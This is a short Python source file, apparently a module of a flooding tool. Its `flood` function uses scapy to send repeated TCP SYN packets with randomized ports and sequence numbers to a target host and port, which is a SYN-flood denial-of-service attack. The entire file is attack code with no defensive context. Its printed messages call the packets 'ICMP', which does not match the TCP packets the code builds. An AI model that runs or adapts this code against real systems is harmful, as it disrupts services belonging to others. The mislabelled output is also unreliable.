# Import modules
from rich.console import Console
from scapy.all import IP, TCP, send, RandShort

# Define styled print
print = Console().print
red = "red3"
green = "green1"
yellow = "yellow1"
pink = "magenta3"


def flood(target):
    packet = IP(dst=target[0]) / TCP(
        dport=target[1], flags="S", seq=RandShort(), ack=RandShort(), sport=RandShort()
    )

    for i in range(4):
        try:
            send(packet, verbose=False)
        except Exception as e:
            print(f"[{red}][!] [{pink}]Error while sending 'ICMP'\n{e}[/{red}]")
        else:
            print(f"[{green}][+] [{yellow}]ICMP packet send to {target[0]} [/{green}]")
